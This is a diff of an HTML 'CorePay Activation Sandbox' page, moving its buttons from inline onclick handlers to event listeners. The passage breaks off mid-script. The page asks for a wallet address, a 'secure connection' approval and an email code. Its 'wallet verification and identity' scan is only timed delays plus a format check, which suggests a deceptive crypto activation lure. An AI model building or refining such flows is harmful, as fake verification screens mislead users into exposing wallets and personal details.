@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CorePay Activation Sandbox</title>
 <style>
 body{
@@ -138,7 +138,7 @@ button:hover{opacity:.9;}
       <option>SOL</option>
     </select>
     <input id="addr" placeholder="Wallet address">
-    <button onclick="finger()">Secure Login</button>
+    <button id="loginBtn">Secure Login</button>
   </div>
 </div>
 
@@ -156,7 +156,7 @@ button:hover{opacity:.9;}
   <div class="box">
     <h3>Wallet Approval</h3>
     <p>Approve secure connection</p>
-    <button onclick="emailStep()">Approve</button>
+    <button id="approveBtn">Approve</button>
   </div>
 </div>
 
@@ -166,7 +166,7 @@ button:hover{opacity:.9;}
     <h3>Email Verification</h3>
     <div id="email1">
       <input id="email" placeholder="Email">
-      <button onclick="sendEmail()">Send Code</button>
+      <button id="sendEmailBtn">Send Code</button>
     </div>
     <div id="emailBarBox" style="display:none">
       <p id="emailStatus">Sending encrypted mail…</p>
@@ -174,7 +174,7 @@ button:hover{opacity:.9;}
     </div>
     <div id="email2" style="display:none">
       <input id="ecode" placeholder="Enter code">
-      <button onclick="verifyEmailCode()">Verify</button>
+      <button id="verifyCodeBtn">Verify</button>
     </div>
   </div>
 </div>
@@ -185,6 +185,21 @@ button:hover{opacity:.9;}
 
 <script>
 document.addEventListener("DOMContentLoaded", ()=>{
+  const addr = document.getElementById("addr");
+  const net = document.getElementById("net");
+  const fingerPop = document.getElementById("fingerPop");
+  const scanTitle = document.getElementById("scanTitle");
+  const scanText = document.getElementById("scanText");
+  const approvePop = document.getElementById("approvePop");
+  const emailPop = document.getElementById("emailPop");
+  const email1 = document.getElementById("email1");
+  const email2 = document.getElementById("email2");
+  const emailBarBox = document.getElementById("emailBarBox");
+  const emailBar = document.getElementById("emailBar");
+  const emailStatus = document.getElementById("emailStatus");
+  const ecode = document.getElementById("ecode");
+  const loadingOverlay = document.getElementById("loadingOverlay");
+
   function validWallet(net,val){
     const rules={
       TRX:/^T[1-9A-HJ-NP-Za-km-z]{33}$/,
@@ -196,24 +211,4 @@ document.addEventListener("DOMContentLoaded", ()=>{
     return rules[net].test(val);
   }
 
-  window.finger = function(){
-    if(addr.value.length<5){alert("Enter wallet");return;}
-    fingerPop.style.display="flex";
-    scanTitle.innerText="Wallet Address Connecting";
-    scanText.innerText="Scanning wallet verification and identity...";
-    let ok=validWallet(net.value,addr.value);
-    let delay= ok ? 10000 : 6000;
-    setTimeout(()=>{
-      scanTitle.innerText= ok ? "Verification Successful" : "Verification Failed";
-      scanText.innerText= ok ? "Wallet confirmed" : "Address format invalid";
-      setTimeout(()=>{
-        fingerPop.style.display="none";
-        if(ok){approvePop.style.display="flex";}
-      },2000);
-    },delay);
-  }
-
-  window.emailStep = function(){approvePop.style.display="none"; emailPop.style.display="flex";}
-  window.sendEmail = function(){
-    let mail=email.value.trim();
-    let valid=/^[^\s@]+@
+  document.getElementById("loginBtn").addEventListener("click", ()=>{
